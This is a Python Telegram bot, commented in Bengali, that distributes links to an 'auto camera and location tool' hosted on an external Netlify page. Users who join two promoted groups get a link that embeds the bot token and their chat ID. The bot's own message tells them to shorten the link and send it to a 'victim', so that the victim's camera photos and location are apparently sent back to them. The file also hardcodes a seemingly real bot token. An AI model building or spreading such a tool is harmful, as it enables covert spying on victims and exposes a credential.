import logging
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ========== কনফিগারেশন ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "8756510522:AAEOEqk0mYKuIr9c7jB0mPCk2JLxogCQhs8")
GROUP_1_ID = int(os.getenv("GROUP_1_ID", -1003710219957))   # আপনার গ্রুপ আইডি
GROUP_2_ID = int(os.getenv("GROUP_2_ID", -1003867100912))
LINK_URL = os.getenv("LINK_URL", "https://hilarious-tanuki-3a2b39.netlify.app/")  # আপনার HTML পেজের লিংক

GROUP_1_INVITE = "https://t.me/+3sHjdk2MXxQyOGE1"
GROUP_2_INVITE = "https://t.me/oxifgaradarkmind"

logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("✅ গ্রুপ ১ জয়েন করুন", url=GROUP_1_INVITE)],
        [InlineKeyboardButton("✅ গ্রুপ ২ জয়েন করুন", url=GROUP_2_INVITE)],
        [InlineKeyboardButton("🔍 জয়েন হয়েছে কিনা চেক করুন", callback_data="check")]
    ]
    await update.message.reply_text(
        "🚀 **অটো ক্যামেরা ও লোকেশন টুল পেতে দুইটি গ্রুপে জয়েন করুন**\n\nজয়েন করে নিচের বাটনে ক্লিক করুন।",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id   # ইউজার A (যে টুল ব্যবহার করবে)
    try:
        member1 = await context.bot.get_chat_member(GROUP_1_ID, user_id)
        member2 = await context.bot.get_chat_member(GROUP_2_ID, user_id)
    except Exception as e:
        await query.edit_message_text("❌ বটকে গ্রুপে অ্যাডমিন বানান অথবা Chat ID সঠিক নয়।")
        return

    ok1 = member1.status in ["member", "administrator", "creator"]
    ok2 = member2.status in ["member", "administrator", "creator"]

    if ok1 and ok2:
        # লিংক তৈরি: ইউজার A-এর chat_id প্যারামিটার হিসেবে যাবে
        user_link = f"{LINK_URL}?bot={BOT_TOKEN}&chat={user_id}"
        keyboard = [
            [InlineKeyboardButton("🎯 ওপেন ক্যামেরা টুল", url=user_link)],
            [InlineKeyboardButton("👤 অশোক", url="https://t.me/your_username"),
             InlineKeyboardButton("🕷️ অক্সিফ", url="https://t.me/your_username")],
            [InlineKeyboardButton("🔗 লিংক শর্ট করুন", url="https://lc.cx/en")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🎯 **Your Device Access Links** ↙️\n\n"
            "🔸 LOCATION + Camera photo and info:\n"
            "নিচের বাটনে ক্লিক করুন।\n\n"
            "📖 উপরের লিংকটি শর্ট করে ভিকটিমকে পাঠাতে পারেন।\n\n"
            "🕷️ **DEV BY OXIF | Stay Anonymous**",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        missing = []
        if not ok1: missing.append("গ্রুপ ১")
        if not ok2: missing.append("গ্রুপ ২")
        await query.edit_message_text(
            f"❌ আপনি এখনো জয়েন করেননি: {', '.join(missing)}\n\nউপরের বাটনে ক্লিক করে জয়েন করুন।\n\n⚠️ বটকে উভয় গ্রুপে **অ্যাডমিন** বানাতে হবে।",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔁 পুনরায় চেক করুন", callback_data="check")]])
        )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(check_callback, pattern="check"))
    app.run_polling()

if __name__ == "__main__":
    main()
